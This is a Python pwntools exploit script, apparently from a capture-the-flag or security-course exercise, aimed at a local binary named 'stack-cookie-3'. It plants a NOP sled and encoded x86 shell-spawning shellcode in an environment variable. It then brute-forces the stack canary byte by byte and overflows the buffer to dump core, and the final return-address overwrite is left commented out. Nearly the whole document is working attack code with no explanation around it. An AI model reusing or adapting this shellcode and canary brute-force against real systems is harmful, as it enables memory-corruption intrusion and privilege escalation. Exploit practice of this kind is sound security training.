
#!/usr/bin/env python

from pwn import *
import os
#context.terminal = ['tmux', 'splitw', '-h']

env = {'SHELLCODE' : '\x90' * 20000 + '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'}

#[ebp+c] arg to system
#[ebp+8]
#[ret]&
#[ebp]AAAA
#[ebp-4]AAAA
#[ebp-8]AAAA
#[ebp-c]canary
#
#[ebp-88]

p = process('stack-cookie-3', env=env)
#gdb.attach(p, 'b*0x0804858f')

#p.sendline("A" * 1000)

#c = Core('core')
#buffer_address = c.stack.find('AAAAAAA')

#print("--> Buffer Address: " + hex(buffer_address))

def send_buffer (buffer):

	p.recvuntil('How many bytes do you want to read?')
	p.sendline('1000')
	p.recvuntil('bytes:')
	p.send(buffer)
	p.recvuntil("Exit status: ")

	return_val = p.recvuntil('\n')
	#print(return_val[0], type(return_val))
	return return_val[0]


base_buffer = "B" * (0x80) + '\x00'

print("--> Started with Buffer:" + base_buffer)

print(type(send_buffer(base_buffer)))

for yz in range (0, 3):
	for x in range (0, 256):
		if send_buffer(base_buffer+chr(x)) == '0':
			base_buffer += chr(x)
			#print("----> [" + str(x) + "] = SUCCESS")
			break
		#else:
			#print("----> [" + str(x) + "] = Failed with buffer: " + base_buffer + chr(x))

print("--> Ended with Buffer:" + base_buffer)

## now we have buffer

#dump core
send_buffer(base_buffer + "A" * 1000)

#c = Core('core')
#shellcode_address = c.stack.find("\x90\x90\x90")

#print ("-----> Env Addr: " + shellcode_adress)

#send_buffer(base_buffer + "A" * 12 + p32(shellcode_address))
#p.interactive()
